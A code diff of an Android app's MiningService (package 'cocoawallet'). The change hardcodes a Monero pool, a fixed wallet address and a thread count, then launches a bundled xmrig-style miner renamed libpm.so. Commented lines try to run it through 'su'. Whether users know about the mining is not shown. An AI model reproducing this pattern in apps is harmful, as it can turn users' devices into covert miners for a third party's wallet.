@@ -18,7 +18,6 @@
 // */
 package com.chadananda.cocoawallet;
 
-
 import android.app.Service;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -56,10 +55,6 @@ public class MiningService extends Service {
     private int accepted;
     private String speed = "./.";
     private String configTemplate;
-
-    /* static {
-         System.loadLibrary("pm");
-     }*/
     //exeptions
     //privatePath/data/user/0/com.chadananda.cocoawallet/files
     public native String stringFromJNI();
@@ -72,7 +67,9 @@ public class MiningService extends Service {
         //path where we may execute our program
 
         //  Log.e("path","path: "+path);
-        //System.loadLibrary("pm");
+         //System.loadLibrary("pm");
+        //System.loadLibrary("myfablib");
+
         // privatePath = this.getApplicationInfo().nativeLibraryDir;
 
         //  File[] fileList = new File(privatePath).listFiles((dir, name) -> {
@@ -85,12 +82,11 @@ public class MiningService extends Service {
         Log.w(LOG_TAG, "my workerId: " + workerId);
 
         String abi = Build.CPU_ABI.toLowerCase();
-        // Tools.copyFile(this,"arm64-v8a" + "/libpm", privatePath + "/libpm.so");
+
         //copy binaries to a path where we may execute it);
 //        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrigCC");
-//       Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
+//        Tools.copyFile(this,"armeabi-v7a" + "/xmrig", privatePath + "/xmrig");
 //        Tools.copyFile(this,"armeabi-v7a" + "/libuv", privatePath + "/libuv.so");
-
     }
 
     public class MiningServiceBinder extends Binder {
@@ -172,21 +168,20 @@ public class MiningService extends Service {
     @RequiresApi(api = Build.VERSION_CODES.O)
     public void startMining(MiningConfig config) {
         Log.i(LOG_TAG, "starting...");
+
        /* if (process != null) {
             Log.i(LOG_TAG, "shutting down old process first...");
             process.destroy();
         }*/
-        // privatePath = getFilesDir().getAbsolutePath();
+
+       // privatePath = getFilesDir().getAbsolutePath();
 
        // String fullPath = "";
         String appDir = "";
         try {
-            // write the config
-
-            // we'll get these from the config object after it's working
              appDir = this.getApplicationInfo().nativeLibraryDir;
+//           String appDir1="/data/app/com.chadananda.cocoawallet/files/lib/armeabi-v7a"
 
-            // Log.d("TAG", "startMining: "+stringFromJNI());
             Log.e("privatePath", "privatePath: " + privatePath);
             String fullPath = "";
             try {
@@ -199,43 +194,60 @@ public class MiningService extends Service {
                         "--huge-pages-jit=TRUE --asm=auto --cpu-memory-pool=-1 --cpu-no-yield --print-time=8" +
                         "--retry-pause=2";
 
-                String args = String.format(config_template,pool,wallet,max_bwt,privatePath);
+                String pool1 = "gulf.moneroocean.stream:10001";
+
+                String wallet1 ="8AaNnN8nQUMh3XQfyt4kEt8TR7RYnowhjVynzShWwVLiR6dWdSp42YeFvouLZoui7S46xSgDxapbeS7Tdqyz7em5Chqd4HA";
+
+                String threads1="3";
+
+                String args = String.format(config_template,pool1,wallet1,threads1,max_bwt);
+
+                //Tools.writeConfig(configTemplate, config.pool, config.username, config.threads, config.maxCpu, privatePath);
+
+                //LibraryLoaderJNI.loadLibrary("/path/to/my_native_lib_A");
                 String[] pm = {"libpm",args};
                 fullPath = privatePath+"/libpm.so";
 
                 ProcessBuilder pb = new ProcessBuilder(pm);
                 Log.e("pbb","pbb"+pb);
+                //pb.directory(new File(appDir));
+                //pb.command(String.valueOf(Runtime.getRuntime().exec("/home/user/myscript.sh param1")));
+                pb.command("libpm.so");
                 pb.directory(new File(appDir));
                 Log.e("appDir","appDir"+appDir);
-                pb.environment().put("LD_LIBRARY_PATH" , appDir);
-                pb.redirectErrorStream(true);
+                pb.environment().put("LD_LIBRARY_PATH",appDir);
+                pb.redirectErrorStream();
                 accepted = 0;
                 Process process = pb.start();
 
+//               process = Runtime.getRuntime().exec("/data/app/com.chadananda.cocoawallet-iPLGf3UD5QwHt3eECe-yiA==/lib/arm64");
+//               process.getInputStream().read();
+
                 Log.e("appDir","process"+process);
-
 //                String writer = new String(String.valueOf(process.getOutputStream()));
-//                String reader = new String(String.valueOf(new InputStreamReader( process.getInputStream() )));
+//                String reader = new String(String.valueOf(new InputStreamReader( process.getInputStream())));
 //                Log.e("writer","writer"+writer);
-
+//                Process su = Runtime.getRuntime().exec("su");
+//                DataOutputStream outputStream = new DataOutputStream(su.getOutputStream());
+//                InputStream response = su.getInputStream();
+//                outputStream.writeBytes("libpm.so");
+//                outputStream.flush();
+//                Log.e("su","su"+response);
                 outputHandler = new MiningService.OutputReaderThread(process.getInputStream());
                 outputHandler.start();
-
                 Log.e("appDir","outputHandler"+outputHandler);
                 Toast.makeText(this, "started:", Toast.LENGTH_SHORT).show();
-
-            } catch (Exception e) {
-                Log.e("launcherror", "error: " + e.getLocalizedMessage() + e.getCause());
+                } catch (Exception e) {
+                Log.e("launcherror", "error: " + e.getLocalizedMessage() );
                 Toast.makeText(this, e.getLocalizedMessage(), Toast.LENGTH_LONG).show();
-                //  File ourApp = new File(fullPath);
+                // File ourApp = new File(fullPath);
                 /* if (ourApp.exists()) {
                 Log.e("launcherror","but file does exist: "+fullPath);
-            } else {
+                } else {
                 Log.e("launcherror","file not found: "+fullPath);
-            }*/
+                }*/
                 //process = null;
                 String outDirString = appDir;
-
                 File ourDir = new File(outDirString);
                 if (ourDir.exists()) {
                     File[] ourFiles = ourDir.listFiles();
